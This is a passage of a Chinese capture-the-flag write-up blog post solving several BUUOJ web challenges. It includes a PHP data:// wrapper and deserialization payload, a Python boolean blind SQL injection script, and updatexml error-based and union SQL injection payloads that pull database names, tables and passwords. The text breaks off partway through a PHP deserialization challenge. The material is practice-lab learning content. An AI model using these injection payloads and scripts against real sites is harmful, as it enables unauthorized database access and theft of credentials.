{"title":"BUUOJ刷题20201019-25","uid":"7de36a2800aed7f2e49e9214b2b8f9f5","slug":"BUUOJ刷题20201019-25","date":"2020-10-25T01:49:01.000Z","updated":"2021-06-28T14:58:06.000Z","comments":true,"path":"api/articles/BUUOJ刷题20201019-25.json","keywords":"A1andNS","cover":"https://gitee.com/A1andNS/blogimage/raw/master/img/3.png","content":"<h2 id=\"ZJCTF-2019-NiZhuanSiWei\"><a href=\"#ZJCTF-2019-NiZhuanSiWei\" class=\"headerlink\" title=\"[ZJCTF 2019]NiZhuanSiWei\"></a>[ZJCTF 2019]NiZhuanSiWei</h2><p>考点：代码审计、PHP伪协议</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>  \n<span class=\"token variable\">$text</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"text\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"file\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$password</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"password\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$text</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;&amp;</span><span class=\"token punctuation\">(</span><span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$text</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'r'</span><span class=\"token punctuation\">)</span><span class=\"token operator\">===</span><span class=\"token string double-quoted-string\">\"welcome to the zjctf\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;br>&lt;h1>\"</span><span class=\"token operator\">.</span><span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$text</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'r'</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"&lt;/h1>&lt;/br>\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/flag/\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"Not now!\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">exit</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> \n    <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">//useless.php</span>\n        <span class=\"token variable\">$password</span> <span class=\"token operator\">=</span> <span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$password</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token variable\">$password</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>首先需要先传入text一个文件内容为“welcome to the zjctf”,然后在传入file参数不能包含flag字段，还有一个反序列化的密码。</p>\n<p>这里先绕过第一个点，读入一个文件包含上面所得welcom的那些内容。这里php://input肯定是用不了了，可以考虑使用data协议，虽然data协议被用来执行PHP代码，但是依旧可以只传入字符串，让其读取。</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">data:&#x2F;&#x2F;text&#x2F;plain;base64,d2VsY29tZSB0byB0aGUgempjdGY&#x3D;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>回现了相关字样，说明绕过第一步了，下面继续。既然不然用flag字符串，那就先看看别的源码</p>\n<p>useless.php</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>  \n\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">Flag</span><span class=\"token punctuation\">&#123;</span>  <span class=\"token comment\">//flag.php  </span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">;</span>  \n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">__tostring</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>  \n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>  \n            <span class=\"token keyword\">echo</span> <span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> \n            <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;br>\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"U R SO CLOSE !///COME ON PLZ\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>  \n    <span class=\"token punctuation\">&#125;</span>  \n<span class=\"token punctuation\">&#125;</span>  \n<span class=\"token delimiter important\">?></span></span>  \n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>简单反序列化,在echo password的时候触发__tostring()方法。</p>\n<p>payload:</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,d2VsY29tZSB0byB0aGUgempjdGY&#x3D;&amp;file&#x3D;useless.php&amp;password&#x3D;O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<pre class=\"line-numbers language-php+HTML\" data-language=\"php+HTML\"><code class=\"language-php+HTML\">\n&lt;br&gt;&lt;h1&gt;welcome to the zjctf&lt;&#x2F;h1&gt;&lt;&#x2F;br&gt;  \n&lt;br&gt;oh u find it &lt;&#x2F;br&gt;\n\n&lt;!--but i cant give it to u now--&gt;\n\n&lt;?php\n\nif(2&#x3D;&#x3D;&#x3D;3)&#123;  \n\treturn (&quot;flag&#123;fd2c8122-5a71-4603-9263-2163ead53b4c&#125;&quot;);\n&#125;\n\n?&gt;\n&lt;br&gt;U R SO CLOSE !&#x2F;&#x2F;&#x2F;COME ON PLZ<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"CISCN2019-华北赛区-Day2-Web1-Hack-World\"><a href=\"#CISCN2019-华北赛区-Day2-Web1-Hack-World\" class=\"headerlink\" title=\"[CISCN2019 华北赛区 Day2 Web1]Hack World\"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h2><p>考点：sql注入、布尔盲注</p>\n<p>sql注入，推测是数字型注入，然后对一些东西做了过滤，例如空格、#、*、or、and，不过还是有一些没有被过滤的。</p>\n<p>这里有四种显示，一种是查询到信息，一种是bool(false)，一种是error,一种是sql注入被检测。</p>\n<p>看懂bool联想到应该是要bool盲注</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> requests\n<span class=\"token keyword\">import</span> time\n\nurl <span class=\"token operator\">=</span> <span class=\"token string\">'http://952f8ab6-3769-4f45-860a-e48ac1dd99f4.node3.buuoj.cn/index.php'</span>\ndata <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token string\">\"id\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">&#125;</span>\nflag <span class=\"token operator\">=</span> <span class=\"token string\">'flag&#123;'</span>\n\ni <span class=\"token operator\">=</span> <span class=\"token number\">6</span>\n<span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span>\n    begin <span class=\"token operator\">=</span> <span class=\"token number\">32</span>\n    end <span class=\"token operator\">=</span> <span class=\"token number\">126</span>\n    mid <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>begin <span class=\"token operator\">+</span> end<span class=\"token punctuation\">)</span> <span class=\"token operator\">//</span> <span class=\"token number\">2</span>\n    <span class=\"token keyword\">while</span> begin <span class=\"token operator\">&lt;</span> end<span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>begin<span class=\"token punctuation\">,</span> mid<span class=\"token punctuation\">,</span> end<span class=\"token punctuation\">)</span>\n        time<span class=\"token punctuation\">.</span>sleep<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\t<span class=\"token comment\">#这里必须设置停顿一秒，不然会触发请求过多了，而导致出错</span>\n        data<span class=\"token punctuation\">[</span><span class=\"token string\">\"id\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"if(ascii(substr((select(flag)from(flag),&#123;&#125;,1))>&#123;&#125;,1,2)\"</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">,</span> mid<span class=\"token punctuation\">)</span>\n        r <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">,</span> data<span class=\"token operator\">=</span>data<span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">if</span> <span class=\"token string\">'Hello'</span> <span class=\"token keyword\">in</span> r<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">:</span>\n            begin <span class=\"token operator\">=</span> mid <span class=\"token operator\">+</span> <span class=\"token number\">1</span>\n            mid <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>begin <span class=\"token operator\">+</span> end<span class=\"token punctuation\">)</span> <span class=\"token operator\">//</span> <span class=\"token number\">2</span>\n        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n            end <span class=\"token operator\">=</span> mid\n            mid <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>begin <span class=\"token operator\">+</span> end<span class=\"token punctuation\">)</span> <span class=\"token operator\">//</span> <span class=\"token number\">2</span>\n\n    flag <span class=\"token operator\">+=</span> <span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span>mid<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span>\n    i <span class=\"token operator\">+=</span> <span class=\"token number\">1</span>\n    <span class=\"token keyword\">if</span> flag<span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token string\">'&#125;'</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">break</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo@master/img/image-20201025123525465.png\" alt=\"image-20201025123525465\"></p>\n<h2 id=\"极客大挑战-2019-HardSQL\"><a href=\"#极客大挑战-2019-HardSQL\" class=\"headerlink\" title=\"[极客大挑战 2019]HardSQL\"></a>[极客大挑战 2019]HardSQL</h2><p>考点：SQL注入、报错注入</p>\n<p>#不能直接用%23就可以了</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">username&#x3D;admin&amp;password&#x3D;123&#39;+or+1&#x3D;1%23<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>登录进去什么都没有，只有一句“你可别被我逮住了，臭弟弟”，试了一下，有过滤，空格，union，by，and，=用不了，空格可以用()包裹的方式来避开使用。=号可以使用like来代替。看看报错注入。</p>\n<p>UPDATEXML (XML_document, XPath_string, new_value);</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>第一个参数：XML_document是String格式，为XML文档对象的名称<br>第二个参数：XPath_string (Xpath格式的字符串)<br>第三个参数：new_value，String格式，替换查找到的符合条件的数据<br>作用：改变文档中符合条件的节点的值<br>报错注入原理：当XPath_string()不满足格式的时候，会报错并把查询信息放到报错信息里<br>通常用 ’ ~ ’制造语法错误用</p></blockquote>\n<p>还要用到一个Like,基本用法</p>\n<p>Like 匹配开头是<code>&#39;per%&#39;</code><br>Like 匹配结尾是<code>&#39;%per&#39;</code><br>Like 匹配中间包含<code>&#39;%per%&#39;</code><br>Like 匹配不包含 <code>&#39;%per%&#39;</code></p>\n<p>payload:</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token number\">1</span>'<span class=\"token operator\">or</span><span class=\"token punctuation\">(</span>updatexml<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span>concat<span class=\"token punctuation\">(</span><span class=\"token number\">0x7e</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">database</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x7e</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">%</span><span class=\"token number\">23</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo@master/img/image-20201025131328497.png\" alt=\"image-20201025130857687\"></p>\n<p>数据库名为geek</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token number\">1</span><span class=\"token string\">'or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like('</span>geek'<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x7e</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">%</span><span class=\"token number\">23</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo@master/img/image-20201025131328497.png\" alt=\"image-20201025131328497\"></p>\n<p>表名为H4rDsq1</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token number\">1</span><span class=\"token string\">'or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like('</span>H4rDsq1'<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x7e</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">%</span><span class=\"token number\">23</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo@master/img/image-20201025131550783.png\" alt=\"image-20201025131550783\"></p>\n<p>列名：id,username,password</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token number\">1</span>'<span class=\"token operator\">or</span><span class=\"token punctuation\">(</span>updatexml<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span>concat<span class=\"token punctuation\">(</span><span class=\"token number\">0x7e</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span><span class=\"token punctuation\">(</span>group_concat<span class=\"token punctuation\">(</span>password<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token keyword\">from</span><span class=\"token punctuation\">(</span>H4rDsq1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x7e</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">%</span><span class=\"token number\">23</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo@master/img/image-20201025131802174.png\" alt=\"image-20201025131802174\"></p>\n<p>显示不全:flag{956cbb6f-a48d-4ece-bf4c-19</p>\n<p>想用substr()，发现被过滤了。试试mid，也被过滤。left,right可以用，用right读出字符串右边内容。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo@master/img/image-20201025132924909.png\" alt=\"image-20201025132924909\"></p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token number\">1</span>'<span class=\"token operator\">or</span><span class=\"token punctuation\">(</span>updatexml<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span>concat<span class=\"token punctuation\">(</span><span class=\"token number\">0x7e</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span><span class=\"token punctuation\">(</span>group_concat<span class=\"token punctuation\">(</span><span class=\"token keyword\">right</span><span class=\"token punctuation\">(</span>password<span class=\"token punctuation\">,</span><span class=\"token number\">30</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token keyword\">from</span><span class=\"token punctuation\">(</span>H4rDsq1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x7e</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">%</span><span class=\"token number\">23</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>f-a48d-4ece-bf4c-199301ac2b94}</p>\n<p>这里合并两个字符串，还要注意找一下不要重复了。</p>\n<p>flag{956cbb6f-a48d-4ece-bf4c-199301ac2b94}</p>\n<h2 id=\"GXYCTF2019-BabySQli\"><a href=\"#GXYCTF2019-BabySQli\" class=\"headerlink\" title=\"[GXYCTF2019]BabySQli\"></a>[GXYCTF2019]BabySQli</h2><p>考点：SQL查询绕过验证</p>\n<p>如果用户不存在会wrong user，密码错误则是用户存在。</p>\n<p>用户admin是存在的。pw处不报错，name处报错</p>\n<p>or，=，(、）被过滤了，尝试url编码绕不过，大小写可以绕过</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">name&#x3D;admin&#39;oRder by 3%23&amp;pw&#x3D;1<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>列数为3列，常规不太好做，回显都是passwd wrong</p>\n<p>发现源码里面的一个注释，这是个base32，由大写字母和数字组成。</p>\n<p>MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5</p>\n<p>解码后得到一个base64编码</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">c2VsZWN0ICogZnJvbSB1c2VyIHdoZXJlIHVzZXJuYW1lID0gJyRuYW1lJw&#x3D;&#x3D;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>解一下</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">select * from user where username &#x3D; &#39;$name&#39;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>这是查询使用的sql语句，这也就是为什么我在pw处没有试出报错,这里的逻辑应该是，用用户名去查信息，然后用返回的信息来和密码做对比，来判断是否成功。</p>\n<p>这里有一个联合注入的细节：</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">select</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">from</span> <span class=\"token keyword\">user</span> <span class=\"token keyword\">where</span> username <span class=\"token operator\">=</span> <span class=\"token string\">'Alan'</span> <span class=\"token keyword\">union</span> <span class=\"token keyword\">select</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span>admin<span class=\"token punctuation\">,</span><span class=\"token number\">202</span>cb962ac59075b964b07152d234b70<span class=\"token punctuation\">,</span><span class=\"token number\">4</span><span class=\"token operator\">%</span><span class=\"token number\">23</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>payload:</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">1&#39; union select 1,admin,202cb962ac59075b964b07152d234b70%23&amp;pw&#x3D;123<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"https://s1.ax1x.com/2020/10/25/BmIvR0.png\" alt=\"image 20201025143247597\"></p>\n<p>本地上mysql试了一下就是这样的结果：</p>\n<p><img src=\"https://s1.ax1x.com/2020/10/25/BmI7qg.png\" alt=\"image 20201025154401115\"></p>\n<h2 id=\"网鼎杯-2020-青龙组-AreUSerialz\"><a href=\"#网鼎杯-2020-青龙组-AreUSerialz\" class=\"headerlink\" title=\"[网鼎杯 2020 青龙组]AreUSerialz\"></a>[网鼎杯 2020 青龙组]AreUSerialz</h2><p>考点：PHP反序列化、PHP强、弱类型比较、代码审计</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n\n<span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"flag.php\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">FileHandler</span> <span class=\"token punctuation\">&#123;</span>\n\n    <span class=\"token keyword\">protected</span> <span class=\"token variable\">$op</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">protected</span> <span class=\"token variable\">$filename</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">protected</span> <span class=\"token variable\">$content</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token variable\">$op</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"1\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$filename</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"/tmp/tmpfile\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$content</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"Hello World!\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token function\">process</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">process</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">op</span> <span class=\"token operator\">==</span> <span class=\"token string double-quoted-string\">\"1\"</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">op</span> <span class=\"token operator\">==</span> <span class=\"token string double-quoted-string\">\"2\"</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token variable\">$res</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token function\">read</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token function\">output</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$res</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token function\">output</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Bad Hacker!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">private</span> <span class=\"token keyword\">function</span> <span 